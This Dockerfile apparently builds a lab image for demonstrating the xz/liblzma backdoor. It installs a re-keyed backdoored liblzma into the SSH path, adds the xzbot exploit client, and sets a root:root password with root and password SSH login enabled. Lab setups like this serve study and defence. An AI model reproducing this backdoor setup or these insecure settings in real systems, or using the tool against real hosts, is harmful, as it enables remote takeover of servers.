FROM debian:12 AS base

ENV DEBIAN_FRONTEND=noninteractive

# Basic networking + debugging tools + SSH
RUN apt-get update && apt-get install -y --no-install-recommends \
    iproute2 \
    iputils-ping \
    dnsutils \
    net-tools \
    tcpdump \
    curl \
    wget \
    ca-certificates \
    vim \
    git \
    autoconf \
    automake \
    libtool \
    zlib1g-dev \
    libssl-dev \
    make \
    xz-utils \
    python3 \
    python3-pip \
    python3.11-venv \
    bpftrace \
    patchelf \
    && rm -rf /var/lib/apt/lists/*

RUN git clone --depth=1 https://github.com/amlweems/xzbot.git

FROM base AS ssh

RUN echo 'Acquire::Check-Valid-Until "false";' > /etc/apt/apt.conf.d/99snapshot && \
    printf "deb-src [check-valid-until=no] http://snapshot.debian.org/archive/debian/20240328T025657Z bookworm main\n" > /etc/apt/sources.list.d/openssh-snapshot.list

RUN apt-get update && apt-get install -y --no-install-recommends \
    build-essential dpkg-dev devscripts \
    git ca-certificates \
    xz-utils \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /build

RUN apt-get update && apt-get build-dep -y --no-install-recommends openssh \
    && apt-get source openssh=1:9.2p1-2+deb12u2 \
    && cd /build/openssh-* \
    && cp /xzbot/openssh.patch . \
    && patch -p1 < openssh.patch \
    && dpkg-buildpackage -b -uc -us \
    && rm -rf /var/lib/apt/lists/*

RUN apt-get update && apt-get install -y --no-install-recommends --allow-downgrades \
    /build/openssh-client_*.deb \
    /build/openssh-server_*.deb \
    /build/openssh-sftp-server_*.deb \
    && apt-get purge -y build-essential dpkg-dev devscripts xz-utils \
    && apt-get autoremove -y \
    && rm -rf /var/lib/apt/lists/* /build/*

WORKDIR /


RUN mkdir -p /var/run/sshd && \
    echo 'root:root' | chpasswd && \
    sed -i 's/^#\?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    printf '\n# Allow rsa-sha1 certs for xz backdoor demo\n' >> /etc/ssh/sshd_config && \
    printf 'PubkeyAcceptedAlgorithms +ssh-rsa-cert-v01@openssh.com\n' >> /etc/ssh/sshd_config && \
    printf 'CASignatureAlgorithms +ssh-rsa\n' >> /etc/ssh/sshd_config

FROM base AS liblzma
# patch the backdoored libxzma object to use our own key
WORKDIR /src

RUN cp /xzbot/assets/liblzma.so.5.6.1 .
RUN python3 -m venv .venv
RUN . .venv/bin/activate && pip install pwntools
RUN shasum -a 256 liblzma.so.5.6.1
RUN . .venv/bin/activate && shasum -a 256 liblzma.so.5.6.1
RUN . .venv/bin/activate && python /xzbot/patch.py liblzma.so.5.6.1

# Install the binary
FROM base AS binary

RUN apt-get update
RUN apt-get install -y --no-install-recommends golang

RUN go install github.com/amlweems/xzbot@latest
# Copy everything to a final image
FROM ssh AS final

WORKDIR /

RUN mkdir /opt/liblzma-patched
COPY --from=liblzma /src/liblzma.so.5.6.1.patch /opt/liblzma-patched/liblzma.so.5
RUN patchelf --set-rpath /opt/liblzma-patched:/lib/x86_64-linux-gnu /lib/x86_64-linux-gnu/libsystemd.so.0
COPY --from=binary /root/go/bin/xzbot /usr/local/sbin/



CMD ["/bin/bash"]
